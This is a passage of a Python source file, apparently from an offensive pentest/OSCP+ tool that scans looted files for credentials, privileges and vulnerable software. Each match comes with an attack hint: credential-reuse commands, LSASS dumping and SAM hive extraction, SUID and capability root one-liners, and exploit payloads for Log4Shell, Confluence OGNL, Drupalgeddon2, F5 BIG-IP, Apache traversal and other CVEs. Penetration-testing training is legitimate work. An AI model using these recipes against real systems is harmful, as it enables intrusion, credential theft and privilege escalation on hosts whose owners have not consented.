                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-29: HAProxy insecure-password user
                    if name == "haproxy user insecure":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"HAProxy userlist: {u}:{pw}",
                                   hint=f"try against HAProxy stats socket / "
                                        f"backend: curl -u '{u}:{pw}' <url>")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-29: HAProxy stats auth
                    if name == "haproxy stats auth":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"HAProxy stats auth: {u}:{pw}",
                                   hint=f"curl -u '{u}:{pw}' http://<haproxy>/stats  "
                                        f"-> shows backend inventory")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-32: Spring datasource properties password
                    if name == "spring datasource props":
                        pw = am.group(1).strip().strip("'\"")
                        if filters.is_placeholder(pw) or pw.startswith(("${", "$")):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Spring datasource password: {pw}",
                                   hint=("Spring app connects to DB with this pw; "
                                         "try against the app + its DB backend"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-32: Python SECRET_KEY (Django/Flask/FastAPI)
                    if name == "python SECRET_KEY":
                        keyname, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val) or val.startswith(("os.", "env")):
                            continue
                        # Django/Flask SECRET_KEY has ~50 char default; 16 min
                        # allows short config for smaller frameworks.
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{keyname}: {val[:60]}{'...' if len(val) > 60 else ''}",
                                   hint=("session/cookie signing key. flask-unsign "
                                         "or django cookie decode: reuse for "
                                         "session forgery"))
                        hit = True
                        break
                    # iter-32: uppercase PASSWORD dict entry (Django DATABASES
                    # + generic JSON/YAML config). iter-42 relabel: pick a
                    # honest label based on file context - Django only when
                    # the file looks like Django settings.py; otherwise
                    # generic config PASSWORD entry.
                    if name == "uppercase PASSWORD dict entry":
                        pw = am.group(1)
                        if filters.is_placeholder(pw) or pw.startswith(("os.", "env")):
                            continue
                        plow_p = path.lower()
                        base_p = os.path.basename(plow_p)
                        is_django = (base_p in ("settings.py", "local_settings.py",
                                                 "production.py")
                                     or "DATABASES" in line
                                     or "django" in plow_p)
                        label = ("Django DATABASES password" if is_django
                                 else "config PASSWORD entry")
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"{label}: {pw}",
                                   hint=(f"connect with '{pw}' - source is "
                                         f"{'Django settings' if is_django else 'a config file'}"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-57: K8s ServiceAccount JWT
                    if name == "k8s serviceaccount token":
                        tok = am.group(1)
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"K8s SA token: {tok[:60]}...",
                                   hint=("kubectl --token='<tok>' --server "
                                         "https://<apiserver>:6443 "
                                         "--insecure-skip-tls-verify get pods -A"))
                        hit = True
                        break
                    # iter-33: PowerShell $env:VARNAME = 'X' + Set-Item env:
                    # iter-43: also [Environment]::SetEnvironmentVariable().
                    if name in ("powershell env var secret",
                                "powershell set-item env",
                                "dotnet env setter"):
                        varname, val = am.group(1), am.group(2)
                        if (filters.is_placeholder(val) or
                                val.startswith(("${", "$", "(", "@"))):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"PowerShell $env:{varname} = {val}",
                                   hint=(f"Windows service-setup provisioning; "
                                         f"reuse '{val}' as service/user pw"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-29: rsyncd secrets file pointer
                    if name == "rsyncd secrets pointer":
                        p_ = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"rsyncd secrets file pointer: {p_}",
                                   hint=(f"read {p_} for 'user:password' rows; "
                                         f"anonymous rsync module if 'auth users' absent"))
                        hit = True
                        break
                    # iter-29: Postfix SASL map pointer
                    if name == "postfix sasl map":
                        p_ = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"Postfix SASL map pointer: {p_}",
                                   hint=(f"read {p_} for 'smtp.host user:pass' rows"))
                        hit = True
                        break
                    # iter-28: .pgpass row hint - already covered by credline
                    # for the classified form; this adds a keyword ASSIGNED
                    # SECRETS record with the host/db context for the operator.
                    if name == "pgpass row hint":
                        host, port, db, u, pw = (am.group(1), am.group(2),
                                                  am.group(3), am.group(4),
                                                  am.group(5))
                        plow = path.lower()
                        base = os.path.basename(plow)
                        if not (base == ".pgpass" or base.endswith(".pgpass")):
                            continue
                        if filters.is_placeholder(pw):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f".pgpass host={host} db={db} {u}:{pw}",
                                   hint=(f"psql -h {host} -p {port} -U '{u}' "
                                         f"-d '{db}'  (uses PGPASSFILE=this)"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    if name == "Terraform sensitive":
                        val = am.group(1)
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Terraform 'sensitive' output: {val[:60]}",
                                   hint="reuse value directly - tfstate keeps the plaintext even when marked sensitive")
                        hit = True
                        break
                    if name == "Azure access token":
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Azure access token: {tok[:40]}...",
                                   hint="paste into az or use roadtools/aztoken; check token claims via jwt.io for tenant + roles")
                        hit = True
                        break
                    if name == "supervisord inet creds":
                        u, p = am.group(1), am.group(2)
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"supervisord inet creds: {u}:{p}",
                                   hint=f"curl -u '{u}:{p}' http://<host>:9001/  (web UI + XML-RPC)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    if name == "asterisk manager":
                        u, p = am.group(1), am.group(2)
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"asterisk manager.conf [{u}]: secret={p}",
                                   hint=(f"asterisk AMI: nc <host> 5038; then send (CRLF-terminated): "
                                         f"'Action: Login\\r\\nUsername: {u}\\r\\nSecret: {p}\\r\\n\\r\\n'   "
                                         "(AMI keys are Username/Secret, not user/secret; CRLF mandatory)"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    if name == "Veeam creds":
                        u, p = am.group(1), am.group(2)
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"Veeam stored cred: {u}:{p}",
                                   hint="Veeam backups carry the destination repo creds; reuse against the SMB/iSCSI target")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    if name == "GH Actions secret ref":
                        # iter-11 FP audit: only fire on real GitHub Actions
                        # workflow files; dedup per (path, secret) so the same
                        # ${{ secrets.X }} doesn't spam N findings per file.
                        if filters.is_doc_file(path):
                            continue
                        plow = path.lower()
                        if not (".github/workflows/" in plow
                                or os.path.basename(plow) == "action.yml"
                                or os.path.basename(plow) == "action.yaml"):
                            continue
                        sec = am.group(1)
                        if sec in seen_svc:
                            continue
                        seen_svc.add(sec)
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"GH Actions secret reference: {sec}",
                                   hint="CI vault secret name - target if you have repo write/PR-comment access")
                        hit = True
                        break
                    if name == "atlassian secret":
                        val = am.group(1)
                        # iter-11 FP audit: <password>X</password> alone fires
                        # on Maven settings, README snippets, Spring XML examples,
                        # Pidgin accounts.xml, anywhere. Gate on:
                        #   1. doc files - never real loot
                        #   2. filename / path that names a known Atlassian /
                        #      tomcat / dbconfig / Pidgin file
                        #   3. value isn't a placeholder OR canonical default
                        #      (changeit/changeit123/admin/tomcat/manager/etc.)
                        if filters.is_placeholder(val) or filters.is_doc_file(path):
                            continue
                        low_v = val.lower().strip("'\"")
                        if low_v in ("changeit", "changeit123", "tomcat",
                                     "manager", "admin", "jonas", "redhat",
                                     "kafka", "jdbc:default"):
                            continue
                        base = os.path.basename(path).lower()
                        plow = path.lower()
                        is_atlassian_file = (
                            base in ("atlassian-user.xml", "dbconfig.xml",
                                     "server.xml", "confluence.cfg.xml",
                                     "jira-config.properties.xml",
                                     "crowd.cfg.xml", "seraph-config.xml",
                                     "accounts.xml")
                            or any(k in plow for k in ("/confluence/", "/jira/",
                                                       "/atlassian/", "/crowd/",
                                                       "/.purple/")))
                        if not is_atlassian_file:
                            # too generic outside an atlassian-shaped path
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"atlassian/<password>: {val}",
                                   hint="reuse against Confluence/Jira admin login; LDAP bind on the same XML often shares the pw")
                        hit = True
                        break
                    if name == "PSCredential SS blob":
                        blob = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"PSCredential Export-Clixml DPAPI blob ({len(blob)//2}B)",
                                   hint="recoverable ONLY by the same user+host: powershell -c 'Import-Clixml cred.xml | %{ \$_.GetNetworkCredential().Password }'")
                        hit = True
                        break
                    if name == "ovpn auth-user-pass":
                        f_ = am.group(1)
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   f"OpenVPN auth-user-pass file ref: {f_}",
                                   hint=f"read {f_} - line 1=user, line 2=plaintext password")
                        hit = True
                        break
                    if name == "WireGuard PrivateKey":
                        key = am.group(1)
                        report.add("HIGH", "PRIVATE KEYS", path, lineno,
                                   f"WireGuard PrivateKey: {key[:24]}...",
                                   hint="copy [Interface] block into wg-quick up <name>.conf and reach internal network")
                        hit = True
                        break
                    if name == "Cisco enable secret":
                        typ, val = am.group(1), am.group(2)
                        if typ == "5":
                            mode, label = "500", "Cisco type-5 (md5crypt)"
                        elif typ == "7":
                            mode, label = "", "Cisco type-7 (reversible XOR)"
                        else:
                            mode, label = "", f"Cisco type-{typ}"
                        sev = "CRITICAL" if typ == "7" else "HIGH"
                        hint = ("offline decrypt via 'ciscot7 -d <val>' (instant - reversible XOR)"
                                if typ == "7" else
                                f"hashcat -m {mode} <hash> rockyou.txt")
                        report.add(sev, "PASSWORD HASHES", path, lineno,
                                   f"{label}: {val[:40]}{'...' if len(val) > 40 else ''}",
                                   hint=hint)
                        hit = True
                        break
                    if name == "token impersonation":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeImpersonate / token-impersonation tooling reference",
                                   hint="if running as a service account: PrintSpoofer / GodPotato / JuicyPotato -> SYSTEM")
                        hit = True
                        break
                    # iter-163: high-value Windows privileges. Each maps to a
                    # distinct EoP path exam-legal for OSCP+ (no vulnerable-
                    # driver farming / no automated commercial tools).
                    if name == "SeBackupPrivilege":
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "SeBackupPrivilege - hive-save primitive available",
                                   hint="reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive; "
                                        "reg save HKLM\\SECURITY security.hive; "
                                        "impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL. "
                                        "On a DC: reg save NTDS.dit via ntdsutil / diskshadow -> R3D chain")
                        hit = True
                        break
                    if name == "SeRestorePrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeRestorePrivilege - registry write primitive",
                                   hint="paired w/ SeBackup for DA-track hive extract; standalone: "
                                        "modify HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>\\ImagePath -> SYSTEM shell on restart")
                        hit = True
                        break
                    if name == "SeTakeOwnershipPrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeTakeOwnershipPrivilege - own any object then WriteDacl",
                                   hint="takeown /F <path>; icacls <path> /grant %USERNAME%:F. "
                                        "Target: services registry key, sethc.exe (sticky-keys), or admin homedir")
                        hit = True
                        break
                    if name == "SeLoadDriverPrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeLoadDriverPrivilege - unsigned driver load",
                                   hint="EDR/lab-only; OSCP+ exam-legal path is limited (BYOVD is grey-area). "
                                        "Note the priv; use only if the box docs it as intended path")
                        hit = True
                        break
                    if name == "SeManageVolumePrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeManageVolumePrivilege - filesystem DACL bypass",
                                   hint="run SeManageVolumeExploit to grant Full Control to C:\\ -> "
                                        "write payload to Windows\\System32\\ shim; boot -> SYSTEM")
                        hit = True
                        break
                    if name == "SeDebugPrivilege":
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   "SeDebugPrivilege - LSASS memory read",
                                   hint="rundll32 comsvcs.dll MiniDump <lsass-pid> lsass.dmp full; "
                                        "then pypykatz lsa minidump lsass.dmp. Standard on admin; "
                                        "surface flags a non-admin having it")
                        hit = True
                        break
                    if name == "SeCreateTokenPrivilege":
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "SeCreateTokenPrivilege - direct SYSTEM token forge (rare)",
                                   hint="use NtCreateToken to forge a SYSTEM primary token then "
                                        "CreateProcessWithToken. Vanishingly rare privilege; when "
                                        "present, instant SYSTEM without exploit")
                        hit = True
                        break
                    if name == "SeTcbPrivilege":
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "SeTcbPrivilege - Act as Part of the OS (tier-0)",
                                   hint="LSA-tier privilege. If a non-SYSTEM account has this, "
                                        "any LogonUser call yields a SYSTEM token")
                        hit = True
                        break
                    # ---- iter-8 round-2: operator-tool typed output ----
                    # Mimikatz/PowerView/Lazagne/cmdkey-saved/DPAPI-cred handled
                    # in _multiline_passes() (multi-line blocks); only the
                    # single-line Rubeus ticket marker is dispatched here.
                    if name == "Rubeus ticket b64":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Rubeus ticket base64 blob",
                                   hint="decode the next b64 block into .kirbi -> .ccache; export KRB5CCNAME and run Kerberos cmds")
                        hit = True
                        break
                    # Rubeus kerberoast user-bound (multi-line) -> _multiline_passes()
                    if name == "PEAS finding":
                        finding = am.group(0).strip()[:140]
                        report.add("HIGH", "RECON", path, lineno,
                                   f"PEAS finding: {finding}",
                                   hint="winPEAS/linPEAS flagged this - follow the highlighted line; check GTFOBins for the binary if SUID/sudo")
                        hit = True
                        break
                    if name == "AlwaysInstallElevated":
                        # iter-16: replaced msfvenom hint - msfvenom-generated
                        # payloads DO count toward the OSCP+ 1-target Metasploit
                        # quota even when run locally. Prefer non-MSF MSI gen so
                        # the AlwaysInstallElevated privesc costs zero MSF budget.
                        report.add("CRITICAL", "RECON", path, lineno,
                                   "AlwaysInstallElevated = 1 (SYSTEM via MSI)",
                                   hint=("non-MSF MSI: WiX (candle+light) wrapping a PowerShell/nim/Go "
                                         "reverse shell; OR write a small C# Installer-class .msi. "
                                         "Then: msiexec /quiet /qn /i evil.msi   "
                                         "(spends 0 MSF budget; msfvenom-generated payloads count toward "
                                         "the 1-target OSCP+ Metasploit limit)"))
                        hit = True
                        break
                    if name == "Snaffler red":
                        # iter-13 severity normalization: this is a PATH, not
                        # the secret content. Demote from CRITICAL to HIGH so
                        # severity matches what the operator actually got.
                        target = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"Snaffler red-flagged file: {target}",
                                   hint=f"read: type \"{target}\" / cat {target}  - Snaffler matched a secret-or-cred rule")
                        hit = True
                        break
                    if name == "smbmap rw share":
                        share, access = am.group(1), am.group(2)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"smbmap writable share: {share} ({access})",
                                   hint=f"smbclient //<host>/{share} -U <user>%<pw>  -> put files / NTLM-trigger SCF / WAR drop")
                        hit = True
                        break
                    if name == "kerbrute valid user":
                        u = am.group(1)
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"kerbrute valid user: {u}",
                                   hint=f"add to users.txt and AS-REPRoast / Kerberoast / password-spray that account")
                        hit = True
                        break
                    # PowerView kerb target -> _multiline_passes()
                    if name == "accesschk RW":
                        principal, target_path = am.group(1), am.group(2).strip()
                        if filters.is_placeholder(principal) or filters.is_placeholder(target_path):
                            continue
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"writable as '{principal}': {target_path}",
                                   hint="if service binary: stop, replace, restart -> SYSTEM. If folder in PATH: drop a binary with command name")
                        hit = True
                        break
                    # cmdkey saved -> _multiline_passes()
                    if name == "PEAS sudo version":
                        ver = am.group(1)
                        try:
                            parts = [int(x) for x in ver.split('.')]
                        except ValueError:
                            continue
                        # iter-13: vulnerable-version match is HIGH (PoC still
                        # requires heap-luck + sudoedit binary present); current
                        # is INFO (just a version string for context).
                        if parts < [1, 9, 5]:
                            sev = "HIGH"
                            cve = "CVE-2021-3156 (Baron Samedit) - sudoedit -s '\\' heap overflow; verify sudoedit present + PoC compiles"
                        else:
                            sev = "INFO"
                            cve = "current - check sudo -l NOPASSWD entries"
                        report.add(sev, "RECON", path, lineno,
                                   f"sudo {ver} - {cve}",
                                   hint="if vulnerable: searchsploit CVE-2021-3156; always run sudo -l for NOPASSWD/GTFOBins")
                        hit = True
                        break
                    if name == "SUID GTFOBins":
                        # iter-13: intel-only privesc primitive (HIGH, not
                        # CRITICAL - operator still has to validate by hand)
                        binary = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"SUID-root GTFOBins-able binary: {binary}",
                                   hint=f"gtfobins.github.io/gtfobins/{os.path.basename(binary)} - SUID section -> root")
                        hit = True
                        break
                    if name == "Linux capability":
                        binary, cap = am.group(1), am.group(2)
                        # iter-13: intel-only - HIGH
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"capability {cap} on {binary}",
                                   hint="cap_setuid+ep on python/perl/ruby = direct root: <bin> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
                        hit = True
                        break
                    if name == "NFS no_root_squash":
                        ex = am.group(1)
                        # iter-13: intel-only privesc primitive - HIGH
                        report.add("HIGH", "RECON", path, lineno,
                                   f"NFS export no_root_squash: {ex}",
                                   hint=f"as root locally: mount -t nfs <target>:{ex} /mnt; copy SUID-shell binary in; gain root on target")
                        hit = True
                        break
                    if name == "CobaltStrike beacon":
                        # iter-13: IOC-only intel (no cred to use). Demote to
                        # MEDIUM/RECON to match peer IOC signals.
                        c2 = am.group(1) or am.group(2) or am.group(3) or ""
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"Cobalt Strike beacon config: {c2[:60]}",
                                   hint="parse with CobaltStrikeParser / 1768.py - C2 URL/staging path/HMAC keys")
                        hit = True
                        break
                    # Lazagne cred -> _multiline_passes()
                    if name == "hashcat status":
                        rec, tot, pct = am.group(1), am.group(2), am.group(3)
                        report.add("INFO", "RECON", path, lineno,
                                   f"hashcat session: cracked {rec}/{tot} ({pct}%)",
                                   hint="check the .potfile for cracked plaintexts (we parse it)")
                        hit = True
                        break
                    # ADO.NET connectionString: parse User ID / Password out cleanly
                    if name == "ADO connectionString":
                        cs = am.group(1)
                        # Iter-7: skip Integrated Security / Trusted_Connection strings
                        # (no password to leak), and skip __VAR__/${VAR}/<TOKEN> templates.
                        cs_low = cs.lower()
                        if ("integrated security" in cs_low
                                or "trusted_connection=yes" in cs_low
                                or "trusted_connection=true" in cs_low):
                            continue
                        pm = re.search(r'(?i)\b(?:password|pwd)\s*=\s*([^;"\'\r\n]{3,})', cs)
                        um = re.search(r'(?i)\b(?:user\s*id|uid|user)\s*=\s*([^;"\'\r\n]{1,60})', cs)
                        if not pm:
                            continue
                        pw = pm.group(1).strip()
                        if (filters.is_placeholder(pw)
                                or pw.startswith('__') and pw.endswith('__')
                                or pw.startswith('${') or pw.startswith('<')):
                            continue
                        u = (um.group(1).strip() if um else "")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"connstring {u + ':' if u else ''}{pw}",
                                   hint=f"DB/service cred: netexec mssql <host> -u '{u or '<user>'}' -p '{pw}' "
                                   "(or mssqlclient.py / reuse on the host)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # ---- iter-9 dispatch branches ----
                    # Ansible Vault header: file-level intel marker, no value to emit
                    if name == "Ansible Vault header":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Ansible Vault AES256 encrypted blob",
                                   hint="ansible-vault decrypt <file>   - need the vault password (look in ~/.vault_pass / playbooks)")
                        hit = True
                        break
                    # Firefox logins.json: encrypted; flag the file
                    if name == "Firefox logins.json":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Firefox logins.json (encrypted creds)",
                                   hint="firefox_decrypt.py <profile-dir>  (needs key4.db; if primary pw set: hashcat -m 26100)")
                        hit = True
                        break
                    # Browser password CSV export header
                    if name == "browser password CSV":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "browser password export CSV (name,url,user,password)",
                                   hint="cat <file>  - cleartext password rows follow the header")
                        hit = True
                        break
                    # PS PSCredential inline: 2 groups (user, pw)
                    if name == "PS PSCredential inline":
                        u, p = am.group(1), am.group(2)
                        if filters.is_placeholder(p) or filters.is_placeholder(u):
                            continue
                        # iter-141: shell-safe escape for pw hint.
                        _p_sh = (p or "").replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"PowerShell PSCredential: {u}:{p}",
                                   hint=f"reuse: netexec smb <DC-IP> -u '{u}' -p '{_p_sh}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # PowerShell -enc payload: decode hint only (b64 -> UTF-16LE)
                    if name == "PowerShell -enc payload":
                        blob = am.group(1)
                        if filters.is_canonical_sample(blob):
                            continue
                        report.add("HIGH", "ENCODED/DECODED", path, lineno,
                                   f"PowerShell -EncodedCommand: {blob[:40]}...",
                                   hint="decode: echo '<b64>' | base64 -d | iconv -f UTF-16LE -t UTF-8")
                        hit = True
                        break
                    # GPP cpassword inline (32-byte AES-CBC blob)
                    # ---- iter-22 dispatch branches ----
                    if name == "Log4Shell JNDI":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "Log4Shell JNDI injection (CVE-2021-44228)",
                                   hint=("verify target: nslookup test.<unique>.dnslog.cn from victim; "
                                         "manual PoC: ldap server (marshalsec) on attacker, "
                                         "${jndi:ldap://<you>:1389/<class>}; OSCP+ legal as single-target"))
                        hit = True
                        break
                    if name == "Spring4Shell classLoader":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "Spring4Shell classLoader (CVE-2022-22965)",
                                   hint=("POST body params class.module.classLoader.resources.context."
                                         "parent.pipeline.first.pattern - manual exploit drops a JSP webshell "
                                         "into the tomcat webroot; verify spring-webmvc + JDK9+"))
                        hit = True
                        break
                    if name == "Confluence OGNL":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "Confluence OGNL injection (CVE-2022-26134)",
                                   hint=("curl <url>/'%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40"
                                         "toString...)%7D/' - get the response body; pre-auth RCE"))
                        hit = True
                        break
                    if name == "ProxyShell autodiscover":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "ProxyShell autodiscover SSRF (CVE-2021-34473)",
                                   hint=("autodiscover@-suffix bypass: SSRF chains to /powershell -> "
                                         "New-MailboxExportRequest webshell drop; manual exploit only"))
                        hit = True
                        break
                    if name == "ProxyLogon X-AnonResource":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "ProxyLogon X-AnonResource-Backend (CVE-2021-26855)",
                                   hint="Exchange SSRF -> /ecp + write-out CMD aspx webshell to %ProgramFiles%")
                        hit = True
                        break
                    if name == "MOVEit human2.aspx":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "MOVEit human2.aspx webshell (CVE-2023-34362)",
                                   hint=("post-SQLi webshell drop in MOVEit wwwroot - if present, "
                                         "the operator already has token-recovery; chain: GET /human2.aspx?... "
                                         "with crafted Cookie:siLockProof header"))
                        hit = True
                        break
                    if name == "TeamCity .jsp bypass":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "TeamCity ;.jsp auth bypass (CVE-2024-27198)",
                                   hint=("/app/rest/users/id:1/tokens/RPC2;.jsp - creates admin API token; "
                                         "then POST /app/rest/users with admin role"))
                        hit = True
                        break
                    if name == "NetScaler NSC_AAAC":
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   "Captured NetScaler NSC_AAAC session cookie (CVE-2023-4966)",
                                   hint=("inject Cookie: NSC_AAAC=<value> into NetScaler /logon/LogonPoint/index.html "
                                         "for session hijack; if AAA enabled, this IS the admin session"))
                        hit = True
                        break
                    if name == "F5 BIG-IP iControl bypass":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "F5 BIG-IP iControl REST Connection-header bypass (CVE-2022-1388)",
                                   hint=("POST /mgmt/tm/util/bash with X-F5-Auth-Token: 0; pre-auth RCE; "
                                         "single-target OSCP+ legal"))
                        hit = True
                        break
                    if name == "GitLab pw-reset double-email":
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "GitLab pw-reset double-email body (CVE-2023-7028)",
                                   hint=("POST /users/password with body 'user[email][]=victim@x&user[email][]=attacker@y' "
                                         "- victim's pw-reset link is delivered to BOTH addresses"))
                        hit = True
                        break
                    if name == "vsftpd 2.3.4 backdoor":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "vsftpd 2.3.4 smiley backdoor (CVE-2011-2523)",
                                   hint=("login with username ending ':)' to trigger backdoor; "
                                         "then nc <host> 6200 for root shell. Manual exploit; exam-legal"))
                        hit = True
                        break
                    if name == "Samba SambaCry banner":
                        if filters.is_doc_file(path):
                            continue
                        ver = am.group(1)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"Samba {ver} - CVE-2017-7494 SambaCry (writable-share RCE)",
                                   hint=("requires writable share + path disclosure; upload .so payload, "
                                         "trigger via writeable named pipe; manual single-target"))
                        hit = True
                        break
                    if name == "Apache 2.4.49/50 traversal":
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "RECON", path, lineno,
                                   "Apache 2.4.49/50 (CVE-2021-41773/42013) path traversal -> RCE",
                                   hint=("curl <url>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd  - if mod_cgi "
                                         "enabled: ' --data 'echo;id' /cgi-bin/.%2e/.../bin/sh '"))
                        hit = True
                        break
                    if name == "HFS 2.3 RCE banner":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "RECON", path, lineno,
                                   "HFS 2.3 (CVE-2014-6287) macro RCE",
                                   hint=("curl <url>/?search=%00{.exec|cmd.exe /c whoami.}  - macro injection "
                                         "in search param; classic HTB Optimum primitive"))
                        hit = True
                        break
                    if name == "Drupal pre-7.59/8.5.1":
                        if filters.is_doc_file(path):
                            continue
                        ver = am.group(0)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"{ver} - CVE-2018-7600 Drupalgeddon2",
                                   hint=("POST /user/register?element_parents=account/mail/%23value with "
                                         "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec; "
                                         "manual single-target"))
                        hit = True
                        break
                    # ---- iter-21 dispatch branches ----
                    if name == "GetUserSPNs CSV row":
                        plow = path.lower()
                        if not ("getuserspns" in plow or "kerberoast" in plow
                                or "spns" in plow or path.lower().endswith((".txt", ".csv", ".tsv"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        spn, user = am.group(1), am.group(2)
                        if user in seen_svc:
                            continue
                        seen_svc.add(user)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"Kerberoastable user: {user}  (SPN: {spn[:50]})",
                                   hint=("impacket-GetUserSPNs <DOMAIN>/<user>:<pw> -dc-ip <dc> -request "
                                         "-outputfile tgs.txt; hashcat -m 13100 tgs.txt rockyou.txt"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="kerberoastable", user=user,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "smbmap -R sensitive file":
                        plow = path.lower()
                        if not ("smbmap" in plow or path.lower().endswith((".txt", ".log", ".md"))):
                            continue
